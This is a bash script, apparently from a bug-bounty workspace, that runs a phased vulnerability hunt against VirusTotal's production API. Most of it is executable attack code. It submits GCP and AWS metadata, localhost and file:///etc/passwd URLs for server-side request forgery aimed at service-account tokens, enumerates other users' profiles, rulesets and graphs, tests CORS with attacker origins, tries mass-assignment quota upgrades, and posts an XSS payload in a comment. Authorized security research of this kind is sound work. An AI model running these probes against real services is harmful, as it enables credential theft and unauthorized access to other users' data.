#!/usr/bin/env bash
# VirusTotal — Phase 3: Vulnerability Discovery
# Requires: VT_API_KEY=<your_free_community_key>
# Get key at: https://www.virustotal.com/gui/sign-in → Account → API Key
# Run: VT_API_KEY=<key> bash scripts/vt-attack.sh 2>&1 | tee ~/vt-attack-output.txt
#
# HYPOTHESES TESTED:
# H1: SSRF via URL submission → redirect chain → GCP IMDS
# H2: SSRF via alternate URL schemes (gopher, ftp, file)
# H3: Analysis ID prediction → access other users' private analyses
# H4: File relationship traversal bypasses privacy flag
# H5: Premium endpoint access with community API key
# H6: Hunting ruleset IDOR (enumerate private enterprise rulesets)
# H7: User/group IDOR (access other users' profile data)
# H8: CORS on authenticated API endpoints
# H9: VT Graph IDOR (access private threat graphs)
# H10: Token/key in URL (does VT accept apikey as query param? log injection risk)

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY environment variable}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com"
mkdir -p "$OUT/03-candidates" "$OUT/evidence"
CANDIDATES="$OUT/03-candidates/candidates.jsonl"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }
ci() { curl -sI --connect-timeout 12 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

log_candidate() {
  local vuln_class="$1" host="$2" severity="$3" evidence="$4" impact="$5"
  local ts; ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  local id; id=$(echo "${vuln_class}${host}${ts}" | md5sum | cut -c1-8)
  echo "{\"id\":\"C${id}\",\"ts\":\"${ts}\",\"vuln_class\":\"${vuln_class}\",\"host\":\"${host}\",\"severity\":\"${severity}\",\"evidence\":\"${evidence}\",\"impact\":\"${impact}\"}" \
    | tee -a "$CANDIDATES"
}

echo "══════════════════════════════════════════════════"
echo "Step 0 — Validate API key + get user context"
echo "══════════════════════════════════════════════════"
ME=$(c "${BASE}/users/me")
echo "$ME" | python3 -m json.tool 2>/dev/null | head -30
# Extract username and tier for use below
VT_USER=$(echo "$ME" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('email','unknown'))" 2>/dev/null || echo "unknown")
VT_TIER=$(echo "$ME" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('attributes',{}).get('quotas',{}).get('api_requests_monthly',{}).get('allowed',0))" 2>/dev/null || echo "0")
echo ""
echo "[*] Logged in as: ${VT_USER}"
echo "[*] Monthly quota: ${VT_TIER}"

echo ""
echo "══════════════════════════════════════════════════"
echo "H1: SSRF via URL submission → GCP metadata"
echo "══════════════════════════════════════════════════"
# VT fetches submitted URLs server-side from GCP VMs.
# Target: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Bypass 1: Direct submission
# Bypass 2: HTTP redirect from our server (use a public redirect service)
# Bypass 3: URL encoding / IPv6 / octal notation for the metadata IP

echo ""
echo "[H1-A] Direct submission of GCP metadata URL..."
RESP_META=$(c -X POST "${BASE}/urls" \
  --data-urlencode "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
echo "$RESP_META" | python3 -m json.tool 2>/dev/null | head -20
ANALYSIS_ID=$(echo "$RESP_META" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "[*] Analysis ID: ${ANALYSIS_ID}"

if [ -n "$ANALYSIS_ID" ]; then
  echo ""
  echo "[H1-A] Waiting 15s then polling analysis result for IMDS data..."
  sleep 15
  RESULT=$(c "${BASE}/analyses/${ANALYSIS_ID}")
  echo "$RESULT" | python3 -m json.tool 2>/dev/null | head -40
  # Check if response body contains GCP token indicators
  if echo "$RESULT" | grep -q "access_token\|token_type\|Bearer\|ya29\."; then
    echo "[!] SSRF CONFIRMED: GCP metadata response in analysis result"
    log_candidate "SSRF-IMDS" "www.virustotal.com" "CRITICAL" \
      "POST /api/v3/urls with url=http://metadata.google.internal/... returns GCP SA token" \
      "Full GCP service account compromise from VirusTotal's scanning infrastructure"
  fi
fi

echo ""
echo "[H1-B] SSRF with AWS IMDS URL..."
RESP_AWS=$(c -X POST "${BASE}/urls" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
echo "$RESP_AWS" | python3 -m json.tool 2>/dev/null | head -10
AWS_ID=$(echo "$RESP_AWS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")

if [ -n "$AWS_ID" ]; then
  sleep 15
  AWS_RESULT=$(c "${BASE}/analyses/${AWS_ID}")
  echo "$AWS_RESULT" | python3 -m json.tool 2>/dev/null | head -20
fi

echo ""
echo "[H1-C] SSRF with IPv6 link-local (fe80::1) as URL..."
c -X POST "${BASE}/urls" --data-urlencode "url=http://[fe80::1]/admin" | head -c 200

echo ""
echo "[H1-D] SSRF: encoded IMDS IPs (octal/hex bypass)..."
# 169.254.169.254 in various encodings
for encoded_ip in "0xa9fea9fe" "0251.0376.0251.0376" "2852039166"; do
  resp=$(c -X POST "${BASE}/urls" --data-urlencode "url=http://${encoded_ip}/latest/meta-data/")
  id=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
  echo "[H1-D] Encoded ${encoded_ip} → analysis_id=${id}"
done

echo ""
echo "[H1-E] SSRF: localhost/127.x URLs..."
for target in "http://127.0.0.1/" "http://localhost/" "http://0.0.0.0/" "http://0x7f000001/"; do
  resp=$(c -X POST "${BASE}/urls" --data-urlencode "url=${target}")
  code=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code','OK'))" 2>/dev/null || echo "?")
  id=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
  echo "[H1-E] ${target} → error=${code} id=${id}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H2: Alternate URL schemes (SSRF via gopher/ftp/file)"
echo "══════════════════════════════════════════════════"
for scheme_url in \
  "file:///etc/passwd" \
  "gopher://127.0.0.1:80/_GET / HTTP/1.0" \
  "ftp://169.254.169.254/latest/meta-data/" \
  "dict://169.254.169.254:80/info" \
  "ldap://169.254.169.254/" \
  "sftp://169.254.169.254/"; do
  resp=$(c -X POST "${BASE}/urls" --data-urlencode "url=${scheme_url}" 2>/dev/null | head -c 200)
  echo "[H2] ${scheme_url:0:40} → ${resp:0:80}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H3: Analysis ID prediction → private analysis access"
echo "══════════════════════════════════════════════════"
# VT analysis IDs format: base64(sha256_hash + "-" + unix_ts)
# For URL analyses: base64url(url + ":" + timestamp)
# Decode a recent analysis ID we created and see if incrementing timestamp works

echo ""
echo "[H3] Submit a URL and decode the analysis ID structure..."
RESP_MY=$(c -X POST "${BASE}/urls" --data-urlencode "url=https://example.com/vt-test-$(date +%s)")
MY_ANALYSIS_ID=$(echo "$RESP_MY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "[*] My analysis ID: ${MY_ANALYSIS_ID}"

if [ -n "$MY_ANALYSIS_ID" ]; then
  # Try to base64-decode the ID to understand the structure
  DECODED=$(echo "$MY_ANALYSIS_ID" | base64 -d 2>/dev/null || python3 -c "
import base64, sys
try:
    pad = '=' * (4 - len('${MY_ANALYSIS_ID}') % 4) if len('${MY_ANALYSIS_ID}') % 4 else ''
    print(base64.b64decode('${MY_ANALYSIS_ID}' + pad).decode('utf-8', errors='replace'))
except Exception as e:
    print(f'decode failed: {e}')
")
  echo "[*] Decoded analysis ID: ${DECODED}"

  # Try accessing the analysis
  c "${BASE}/analyses/${MY_ANALYSIS_ID}" | python3 -m json.tool 2>/dev/null | head -20
fi

echo ""
echo "[H3] Try accessing non-existent / manipulated analysis IDs..."
# Common test IDs that might exist
for test_id in \
  "dGVzdA==" \
  "YWJjZGVm" \
  "MTIzNDU2Nzg5MA=="; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/analyses/${test_id}")
  echo "[H3] ${test_id} → ${code}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H4: File relationship traversal — privacy bypass"
echo "══════════════════════════════════════════════════"
# EICAR test file sha256 (public, well-known)
EICAR_SHA256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
echo ""
echo "[H4] Public file relationships (EICAR test file)..."
for rel in "contacted_ips" "contacted_domains" "contacted_urls" "embedded_urls" \
           "execution_parents" "compressed_parents" "overlay_parents" \
           "pe_resource_parents" "email_parents" "bundled_files" "related_references" \
           "similar_files" "itw_domains" "itw_ips" "itw_urls" "comments" "votes"; do
  resp=$(c "${BASE}/files/${EICAR_SHA256}/relationships/${rel}")
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/files/${EICAR_SHA256}/relationships/${rel}")
  count=$(echo "$resp" | python3 -c "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',[])))" 2>/dev/null || echo "?")
  echo "[H4] ${code}  /files/EICAR/relationships/${rel}  count=${count}"
done

echo ""
echo "[H4-B] Upload a file, get its SHA256, then test if its relationships are accessible by another user..."
# Submit EICAR test string as a file
EICAR_CONTENT='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
RESP_UPLOAD=$(curl -sk --connect-timeout 30 -A "$UA" \
  -H "x-apikey: ${VT_API_KEY}" \
  -X POST "${BASE}/files" \
  -F "file=@-;filename=test.txt" <<< "$EICAR_CONTENT" 2>/dev/null || echo "{}")
echo "$RESP_UPLOAD" | python3 -m json.tool 2>/dev/null | head -15

echo ""
echo "══════════════════════════════════════════════════"
echo "H5: Premium endpoint access with free API key"
echo "══════════════════════════════════════════════════"
echo ""
echo "[H5-A] Intelligence search (premium) with free key..."
INTEL_RESP=$(c "${BASE}/intelligence/search?query=type:peexe+positives:5+tag:signed")
echo "$INTEL_RESP" | python3 -m json.tool 2>/dev/null | head -20
INTEL_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/intelligence/search?query=type:peexe")
echo "[H5-A] /intelligence/search HTTP code: ${INTEL_CODE}"

echo ""
echo "[H5-B] Retrohunt job listing (enterprise feature)..."
RETRO=$(c "${BASE}/retrohunt_jobs")
echo "$RETRO" | python3 -m json.tool 2>/dev/null | head -15
RETRO_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/retrohunt_jobs")
echo "[H5-B] /retrohunt_jobs HTTP code: ${RETRO_CODE}"

echo ""
echo "[H5-C] Live hunting rules (enterprise)..."
HUNT=$(c "${BASE}/hunting_rulesets")
echo "$HUNT" | python3 -m json.tool 2>/dev/null | head -15
HUNT_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/hunting_rulesets")
echo "[H5-C] /hunting_rulesets HTTP code: ${HUNT_CODE}"

echo ""
echo "[H5-D] Intelligence file feed (premium)..."
FEED=$(c "${BASE}/feeds/files")
echo "$FEED" | python3 -m json.tool 2>/dev/null | head -15
FEED_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/feeds/files")
echo "[H5-D] /feeds/files HTTP code: ${FEED_CODE}"

echo ""
echo "[H5-E] Private file intelligence...  "
PRIV=$(c "${BASE}/private/files")
PRIV_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
  -H "x-apikey: ${VT_API_KEY}" "${BASE}/private/files")
echo "[H5-E] /private/files HTTP code: ${PRIV_CODE} | body: $(echo "$PRIV" | head -c 100)"

echo ""
echo "[H5-F] Error code differential — do premium endpoints leak existence?"
# For non-existent resources: expect 404
# For existing but forbidden premium resources: might get 403 vs 404
# If the error code differs, we can enumerate real enterprise objects
for ep in \
  "/intelligence/search" \
  "/retrohunt_jobs/nonexistent_id_aaaa" \
  "/hunting_rulesets/nonexistent_id_aaaa" \
  "/feeds/files/cursor/0" \
  "/private/files/aaaaaaa" \
  "/monitors/nonexistent" \
  "/ioc_stream"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}${ep}")
  resp=$(c "${BASE}${ep}" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code',''))" 2>/dev/null || echo "")
  echo "[H5-F] ${code}  ${ep}  error_code=${resp}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H6: Hunting Ruleset IDOR — enumerate other users' rulesets"
echo "══════════════════════════════════════════════════"
# If ruleset IDs are sequential or guessable, brute-force reveals private YARA rules
# Get our own ruleset ID first (if any), then probe neighbors

echo ""
echo "[H6] List my own rulesets..."
MY_RULES=$(c "${BASE}/hunting_rulesets?limit=10")
echo "$MY_RULES" | python3 -m json.tool 2>/dev/null | head -20

# Try known public ruleset ID patterns
for ruleset_id in \
  "1" "2" "3" "100" "1000" \
  "aaaaaaaaaaaaaaaa" \
  "rule_1" "public_1" "default"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/hunting_rulesets/${ruleset_id}")
  echo "[H6] ${code}  /hunting_rulesets/${ruleset_id}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H7: User/Group IDOR"
echo "══════════════════════════════════════════════════"

echo ""
echo "[H7-A] My own user details..."
MY_USER=$(c "${BASE}/users/me")
echo "$MY_USER" | python3 -m json.tool 2>/dev/null | head -25
MY_ID=$(echo "$MY_USER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "[*] My user ID: ${MY_ID}"

echo ""
echo "[H7-B] Access another user's profile by ID manipulation..."
if [ -n "$MY_ID" ]; then
  # Try modifying characters in the user ID
  ALT_ID=$(echo "$MY_ID" | sed 's/./X/g')
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/users/${ALT_ID}")
  echo "[H7-B] /users/${ALT_ID} → ${code}"

  # Try accessing user by known VT usernames (public researchers)
  for known_user in "virustotal" "admin" "test" "support" "google"; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
      -H "x-apikey: ${VT_API_KEY}" "${BASE}/users/${known_user}")
    resp=$(c "${BASE}/users/${known_user}" | head -c 150)
    echo "[H7-B] ${code}  /users/${known_user}  ${resp:0:60}"
  done
fi

echo ""
echo "[H7-C] Group enumeration..."
for group_id in "google" "virustotal" "admin" "1" "2" "test"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/groups/${group_id}")
  resp=$(c "${BASE}/groups/${group_id}" | head -c 100)
  echo "[H7-C] ${code}  /groups/${group_id}  ${resp:0:60}"
done

echo ""
echo "[H7-D] User relationships (comments, votes, files submitted)..."
if [ -n "$MY_ID" ]; then
  for rel in "comments" "votes" "files" "hunting_rulesets" "graphs" "collections"; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
      -H "x-apikey: ${VT_API_KEY}" "${BASE}/users/${MY_ID}/relationships/${rel}")
    echo "[H7-D] ${code}  /users/${MY_ID}/relationships/${rel}"
  done

  echo ""
  echo "[H7-E] Can I access another user's relationship data?"
  # Try accessing public VT user "virustotal" relationships
  for rel in "comments" "votes" "files"; do
    code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 \
      -H "x-apikey: ${VT_API_KEY}" "${BASE}/users/virustotal/relationships/${rel}")
    resp=$(c "${BASE}/users/virustotal/relationships/${rel}" | head -c 200)
    echo "[H7-E] ${code}  /users/virustotal/relationships/${rel}  ${resp:0:80}"
    # Flag if 200 with data (IDOR confirmed)
    if [ "$code" = "200" ]; then
      echo "[!] POTENTIAL IDOR: /users/virustotal/relationships/${rel} returned 200"
      log_candidate "IDOR-user-relationships" "www.virustotal.com" "MEDIUM" \
        "GET /api/v3/users/virustotal/relationships/${rel} → 200 OK with data" \
        "Access to another user's ${rel} data without authorization"
    fi
  done
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "H8: CORS on authenticated endpoints"
echo "══════════════════════════════════════════════════"
echo ""
echo "[H8] Testing CORS policy on authenticated API..."
for origin in "https://evil.com" "https://attacker.virustotal.com" "null" "https://virustotal.com.evil.com"; do
  resp=$(curl -sk --connect-timeout 8 -A "$UA" \
    -H "x-apikey: ${VT_API_KEY}" \
    -H "Origin: ${origin}" \
    -I "${BASE}/users/me")
  acao=$(echo "$resp" | grep -i "access-control-allow-origin" | head -1 | tr -d '\r')
  acac=$(echo "$resp" | grep -i "access-control-allow-credentials" | head -1 | tr -d '\r')
  echo "[H8] Origin: ${origin}"
  echo "      ACAO: ${acao}"
  echo "      ACAC: ${acac}"
  if echo "$acao" | grep -q "$origin\|\*"; then
    echo "[!] CORS MISCONFIGURATION: ${origin} is reflected/allowed"
    log_candidate "CORS-sensitive-data" "www.virustotal.com" "HIGH" \
      "Access-Control-Allow-Origin reflects ${origin} with API key auth" \
      "Attacker can steal VT API responses (API key data, user info) via XSS on any site"
  fi
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H9: VT Graph IDOR — private graph access"
echo "══════════════════════════════════════════════════"
echo ""
echo "[H9-A] List my own graphs..."
MY_GRAPHS=$(c "${BASE}/graphs?limit=10")
echo "$MY_GRAPHS" | python3 -m json.tool 2>/dev/null | head -20

echo ""
echo "[H9-B] Try known/public graph ID patterns..."
for graph_id in \
  "g-00000000000000000" \
  "g-test" \
  "g-1" \
  "g-google" \
  "public_graph_1"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 6 \
    -H "x-apikey: ${VT_API_KEY}" "${BASE}/graphs/${graph_id}")
  resp=$(c "${BASE}/graphs/${graph_id}" | head -c 100)
  echo "[H9-B] ${code}  /graphs/${graph_id}  ${resp:0:60}"
done

echo ""
echo "══════════════════════════════════════════════════"
echo "H10: URL analysis — can we see scanner request headers?"
echo "══════════════════════════════════════════════════"
# If we control a server and submit its URL to VT for scanning,
# the request VT makes to our server reveals the scanner's IP and any
# internal headers (X-Forwarded-For showing internal GCP IPs, etc.)
# We use an interactsh or webhook.site URL for OOB detection

echo ""
echo "[H10] Submit URL for scanning — check what the scanner looks like..."
echo "To test this properly, use an OOB collaborator:"
echo "  1. Get a URL from webhook.site or interactsh"
echo "  2. Run: VT_API_KEY=\$VT_API_KEY COLLAB_URL=https://webhook.site/<id> bash scripts/vt-ssrf-oob.sh"
echo "  3. Check the webhook site for the VT scanner's User-Agent and IP"

# Submit to httpbin for a quick check (if accessible)
HTTPBIN_RESP=$(c -X POST "${BASE}/urls" \
  --data-urlencode "url=https://httpbin.org/get")
HTTPBIN_ID=$(echo "$HTTPBIN_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")
echo "[H10] Submitted httpbin.org for analysis, ID=${HTTPBIN_ID}"

if [ -n "$HTTPBIN_ID" ]; then
  sleep 20
  echo "[H10] Polling result for scanner headers..."
  HTTPBIN_RESULT=$(c "${BASE}/analyses/${HTTPBIN_ID}")
  echo "$HTTPBIN_RESULT" | python3 -m json.tool 2>/dev/null | head -30
  # Look for any metadata about the scanner
  echo "$HTTPBIN_RESULT" | grep -i "ip\|user.agent\|x-forwarded\|requester" | head -10
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "H11: Object type confusion + method override"
echo "══════════════════════════════════════════════════"

echo ""
echo "[H11-A] Method override (POST as PATCH/DELETE)..."
for method in "PATCH" "DELETE" "PUT"; do
  code=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
    -H "x-apikey: ${VT_API_KEY}" \
    -H "X-HTTP-Method-Override: ${method}" \
    -X POST "${BASE}/users/me")
  echo "[H11-A] X-HTTP-Method-Override: ${method} → ${code}"
done

echo ""
echo "[H11-B] PATCH my own user profile (check if writable fields leak to others)..."
PATCH_RESP=$(c -X PATCH "${BASE}/users/me" \
  -H "Content-Type: application/json" \
  -d '{"data":{"attributes":{"profile_description":"VT-SECURITY-RESEARCHER-TEST"}}}')
echo "$PATCH_RESP" | python3 -m json.tool 2>/dev/null | head -10
PATCH_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
  -H "x-apikey: ${VT_API_KEY}" \
  -X PATCH "${BASE}/users/me" \
  -H "Content-Type: application/json" \
  -d '{"data":{"attributes":{"profile_description":"VT-SECURITY-RESEARCHER-TEST"}}}')
echo "[H11-B] PATCH /users/me: ${PATCH_CODE}"

echo ""
echo "[H11-C] Mass assignment — try setting quota/tier fields..."
MASS=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
  -H "x-apikey: ${VT_API_KEY}" \
  -X PATCH "${BASE}/users/me" \
  -H "Content-Type: application/json" \
  -d '{"data":{"attributes":{"quota":"enterprise","tier":"premium","api_requests_hourly":{"allowed":10000}}}}')
echo "[H11-C] Mass assignment (quota upgrade attempt): ${MASS}"

echo ""
echo "══════════════════════════════════════════════════"
echo "H12: Comments IDOR + stored XSS"
echo "══════════════════════════════════════════════════"

echo ""
echo "[H12-A] List public comments on EICAR file..."
EICAR_SHA256="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
COMMENTS=$(c "${BASE}/files/${EICAR_SHA256}/comments?limit=5")
echo "$COMMENTS" | python3 -m json.tool 2>/dev/null | head -20

echo ""
echo "[H12-B] Post a comment with HTML payload..."
COMMENT_RESP=$(c -X POST "${BASE}/files/${EICAR_SHA256}/comments" \
  -H "Content-Type: application/json" \
  -d '{"data":{"attributes":{"text":"Test comment <img src=x onerror=console.log(1)> by security researcher - please ignore"}}}')
COMMENT_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 8 -A "$UA" \
  -H "x-apikey: ${VT_API_KEY}" \
  -X POST "${BASE}/files/${EICAR_SHA256}/comments" \
  -H "Content-Type: application/json" \
  -d '{"data":{"attributes":{"text":"Test comment <img src=x onerror=console.log(1)> by security researcher - please ignore"}}}')
echo "$COMMENT_RESP" | python3 -m json.tool 2>/dev/null | head -10
echo "[H12-B] POST comment: ${COMMENT_CODE}"
COMMENT_ID=$(echo "$COMMENT_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('id',''))" 2>/dev/null || echo "")

if [ -n "$COMMENT_ID" ]; then
  echo "[*] Created comment ID: ${COMMENT_ID}"
  echo "[H12-B] Deleting test comment..."
  c -X DELETE "${BASE}/comments/${COMMENT_ID}" | head -c 100
fi

echo ""
echo "══════════════════════════════════════════════════"
echo "Summary: Candidate Findings"
echo "══════════════════════════════════════════════════"
if [ -f "$CANDIDATES" ] && [ -s "$CANDIDATES" ]; then
  echo ""
  echo "=== CANDIDATES FOUND ($(wc -l < "$CANDIDATES")) ==="
  while IFS= read -r line; do
    echo "$line" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f\"[{d.get('severity')}] {d.get('vuln_class')}: {d.get('evidence')[:80]}\")" 2>/dev/null
  done < "$CANDIDATES"
else
  echo "No candidates flagged automatically. Review raw output for manual leads."
fi
echo ""
echo "Full results in: $OUT/03-candidates/"
echo "Next: verify any candidates manually, then run triage."
